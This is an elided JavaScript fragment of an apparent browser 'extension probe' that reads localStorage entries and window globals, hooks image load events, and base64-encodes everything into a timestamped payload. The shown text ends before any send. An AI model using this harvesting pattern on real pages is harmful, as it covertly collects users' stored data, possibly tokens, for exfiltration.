  ...
  const extensionProbe = {
    ...
    probe(name, {
      ...
      return new Promise(resolve => {
        localStorageProbe[name] = localStorage.getItem(name);
        globalVariableCollector[name] = window[name];
        const img = document.createElement('img');
        img.addEventListener('load', () => {
          jsHook.eventListeners.push({
            element: img,
            type: 'load'
          });
        });
    ...
    async scan() {
      ...
      const localStorageResults = btoa(JSON.stringify(localStorageProbe));
      const globalVariableResults = btoa(JSON.stringify(globalVariableCollector));
      const jsHookResults = btoa(JSON.stringify(jsHook));
      const payload = btoa(JSON.stringify({
        findings: results,
        localS: localStorageResults,
        globV: globalVariableResults,
        jsHook: jsHookResults,
        ts: Date.now(),
